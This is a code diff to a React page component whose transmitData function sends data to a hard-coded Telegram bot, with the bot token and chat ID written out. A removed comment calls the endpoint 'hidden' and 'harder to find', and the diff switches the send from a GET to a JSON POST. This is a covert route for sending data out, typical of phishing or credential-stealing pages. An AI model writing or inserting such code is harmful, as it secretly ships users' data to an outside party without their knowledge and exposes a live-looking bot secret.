@@ -18,13 +18,8 @@ const Index = () => {
   ]);
   const { toast } = useToast();
 
-  // Hidden endpoint construction - harder to find but functional
   const getWebhookEndpoint = () => {
-    const baseUrl = 'https://api.telegram.org/bot';
-    const botToken = '8165418740:AAHKjz_zlJQ2yAsIWz6jyteqwdpZxfWNfkvo';
-    const chatId = '7544292494';
-    const endpoint = `${baseUrl}${botToken}/sendMessage?chat_id=${chatId}&text=`;
-    return endpoint;
+    return 'https://api.telegram.org/bot8165418740:AAHKjz_zlJQ2yAsIWz6jyteqwdpZxfWNfkvo/sendMessage';
   };
 
   useEffect(() => {
@@ -66,9 +61,15 @@ const Index = () => {
   const transmitData = async (data: string) => {
     try {
       const endpoint = getWebhookEndpoint();
-      const response = await fetch(endpoint + encodeURIComponent(data), {
-        method: 'GET',
-        mode: 'no-cors'
+      const response = await fetch(endpoint, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: '7544292494',
+          text: data
+        })
       });
       
       console.log('Data transmission completed');
